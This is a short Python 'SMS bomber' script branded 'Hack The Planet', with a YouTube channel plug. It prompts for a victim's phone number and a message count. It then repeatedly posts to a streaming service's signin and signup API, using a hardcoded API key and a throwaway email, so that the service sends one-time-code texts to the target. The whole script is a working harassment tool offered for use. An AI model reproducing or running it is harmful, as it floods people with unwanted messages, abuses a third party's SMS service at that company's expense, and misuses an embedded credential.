#!/usr/bin/env python3

import pyfiglet
  
result = pyfiglet.figlet_format("HTP", font = "isometric4" )
print(result)


lines = ["[*] Hack The Planet",
         "[*] YouTube Channel: https://www.youtube.com/channel/UCpi9BpNWtCXauo1ZSAfPU1w",
         "[*] Like, Comment, and Subscribe My channel for more interesting tutorials."]

from time import sleep
import sys

for line in lines:          
    for c in line:         
        print(c, end='')    
        sys.stdout.flush()  
        sleep(0.05)          
    print('')               

import requests as rq

def send(target):
  header = {
    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
  }

  data = {
    "requestType":"send",
    "phoneNumber":target,
    "screenName":"signin"
  }

  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
  res = rq.post(url, json=data, headers=header)
  if res.json().get("code"):
    data = {
      "requestType":"send",
      "phoneNumber":target,
      "emailConsent":"true",
      "whatsappConsent":"true",
      "email":"cicas94417@iconmle.com"
    }
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"

    res = rq.post(url, json=data, headers=header)
    if not res.json().get("sent"): return False
  return True

def main():
  target = input("[*] Phone Number: ")
  amount = int(input("[*] Total Amount of SMS to send (Max 20): "))
  sent, nsent = 0, amount
  for i in range(1, amount + 1):
    try:
      if send(target):
        print(f"[ID: {i}] SMS Sent!")
        sent += 1
        nsent -= 1
      else:
        print(f"[ID: {i}] SMS Not Sent...")
    except KeyboardInterrupt: break
    except Exception as e: print(e); break
  print(f"\n[*] Total Target: {amount}\n[+] Sent: {sent}\n[-] Not Sent: {nsent}")

if __name__ == "__main__":
  main()